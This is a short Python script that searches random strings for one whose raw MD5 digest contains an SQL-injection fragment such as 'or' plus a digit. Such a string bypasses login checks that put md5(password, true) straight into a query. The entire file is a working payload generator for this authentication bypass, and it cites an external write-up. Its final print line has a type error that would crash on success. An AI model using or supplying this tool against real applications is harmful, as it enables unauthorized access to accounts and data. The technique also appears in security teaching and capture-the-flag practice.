'''
author: Kexuan Zou
external reference: http://cvk.posthaven.com/sql-injection-with-raw-md5-hashes
description: This script finds suitable plaintext password so that its md5 raw value can perform an SQL injection.
'''

from hashlib import md5
import re, os, time

def get_md5_raw(input):
    m = md5()
    m.update(input)
    return m.digest()

def check_md5(plain):
    hash_str = get_md5_raw(plain)
    obj = re.search(r"('\|\|'\d|'OR'\d|'or'\d)", hash_str)
    if obj:
        return True;
    else:
        return False;

if __name__ == '__main__':
    start_time = time.time()
    length = 64 # length of random string
    while (True):
        plain = os.urandom(length).encode('hex')
        if check_md5(plain):
            print("String found: " + plain)
            print("Time consumed: " + time.time()-start_time + "seconds.")
            break
